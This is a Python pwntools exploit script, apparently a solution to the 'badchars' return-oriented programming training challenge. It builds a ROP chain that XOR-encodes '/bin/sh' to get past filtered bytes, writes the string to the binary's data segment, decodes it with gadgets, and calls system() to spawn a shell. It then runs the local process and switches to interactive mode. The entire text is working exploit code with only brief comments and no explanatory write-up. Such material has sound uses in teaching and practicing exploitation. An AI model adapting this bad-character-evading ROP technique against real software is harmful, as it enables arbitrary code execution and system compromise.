from pwn import *

# DO NOT write at start of data segment, it gets used by libc and fucks things up.
data_seg       = 0x601050
system_plt = 0x4006f0

# Gadgets needed to write data
pop_r12_13   = 0x400b3b # pop r12 ; pop r13 ; ret
mov_r13_r12  = 0x400b34 # mov qword ptr [r13], r12 ; ret

# Gadgets needed to decode string
pop_r14_r15  = 0x400b40 # pop r14 ; pop r15 ; ret
xor_r15_r14b = 0x400b30 # xor byte ptr [r15], r14b ; ret

# Gadget needed to call system()
pop_rdi      = 0x400b39 # pop rdi ; ret

bin_sh = '/bin/sh\x00'
encoded_bin_sh = ''
xor_byte = 0x23

for i in bin_sh:
    encoded_bin_sh = encoded_bin_sh + chr(ord(i) ^ xor_byte)

# RIP offset is at 40
rop = "A" * 40

# Write encoded /bin/sh to data_seg
rop += p64(pop_r12_13)
rop += encoded_bin_sh
rop += p64(data_seg)
rop += p64(mov_r13_r12)

# Decode data
for i in range(len(encoded_bin_sh)):
    rop += p64(pop_r14_r15)
    rop += p64(xor_byte)
    rop += p64(data_seg + i)
    rop += p64(xor_r15_r14b)

# Pop address to '/bin/sh'
rop += p64(pop_rdi)
rop += p64(data_seg)

# call system@plt
rop += p64(system_plt)

# Start process and send rop chain
e = process('badchars')
print e.recv()
e.sendline(rop)
e.interactive()
